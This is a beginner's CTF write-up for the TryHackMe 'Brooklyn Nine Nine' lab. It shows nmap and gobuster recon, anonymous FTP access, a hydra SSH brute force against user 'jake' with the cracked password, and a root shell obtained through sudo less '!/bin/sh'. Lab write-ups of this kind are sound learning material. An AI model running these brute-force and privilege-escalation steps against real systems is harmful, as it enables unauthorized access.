# Brooklyn Nine Nine - CTF writeup

- **Platform** : **TryHackMe**
- **Name** : **Brooklyn Nine Nine**
- **Category** : **ssh bruteforcing and ftp**
- **Difficulty** : **Easy**
- **Date Completed** : **21.10.2026**


## Objective

- To capture the flags hidden in an account owned by a person named 'Jake'

## Methodology

- **reconnaissance ==> bruteforce ==> Privilege escalation**

## Actions

### step 1

- I use Nmap to find the open ports and their running services.

'''bash: nmap -sV -F -T4 <TARGET_IP>'''

**Findings**

        I find open ports on 21/tcp running ftp server , 22/tcp running ssh, and 80/tcp runninghttp.

### step 2

When I go to the http site , It is just an image.

I see nothing useful in source code also.

### step 3

So I use gobuster for further investigation.

=> gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

**Findings**

        I find useful even with gobuster.

- **I have to use another approach.**

### step 4

I gonna login to ftp by using 'anonymous' as username and password.

Since it is the default for most of the login on TryHackMe.

==> ftp <TARGET_IP>

And then, add anonymous as both username and password.

**Findings**

        Yesss, I am in ftp server as anonymous.

### step 5

I check the exiting file or folder .

==> ls

**Findings**

        I find a text file named 'note_to_jake.txt', so I download it to my PC.

### step 6

I download the text file.

==> get note_to_jake.txt

And exit from the ftp server by

==> exit

### step 7

I open the text file, it is from a person named 'amy' telling jake to change his password sinceit's too weak.

==> cat note_to_jake.txt

### step 8

I gonna check the ssh server now, since other two don't give me enough information about the flag.

### step 9

I use hydra to bruteforce ssh login setting username as 'jake' and wordlist as rockyou.txt .

==> hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>/

**Findings**

        I get the password , it is 987654321 .

### step 10

Now I have both username and password for ssh login.

==> ssh jake@<TARGET_IP>

Enter the password.

### step 11

Now, I am in jake account. I have to user flag.

### step 12

Let's find the flag in home directory first.

==> cd ../../../../

==> cd home/

Go to every directories for the flag.

### step 13

I find the flag in /home/holt/ directory.

# Mission one DONE.

### step 14

Now it's time for the root flag.

**Analysis**

        For the root flag, I need root privilege

### step 15

I check

==> sudo -l

And findout that I can get the root as sudo ,and we can see less.

### step 16

I go to GTFOBin.com for root privilege access command.

I search by typing 'less' and search command in SHELL and SUDO.

**Findings**

        I find the command for root access

        ==> sudo less/etc/hosts
        ==> !/bin/sh

### step 17

I copy and paste the command in the jake account terminal.

AND I get another shell.

### step 18

I check

==> whoami

And it says 'root'.

I find the flag by

==> cat /root/root.txt

## YESSS I find the root flag.

#Challenge COMPLETED

- **Tools used** : **Hydra**
- **Additional resources** : **GTFOBin.com**
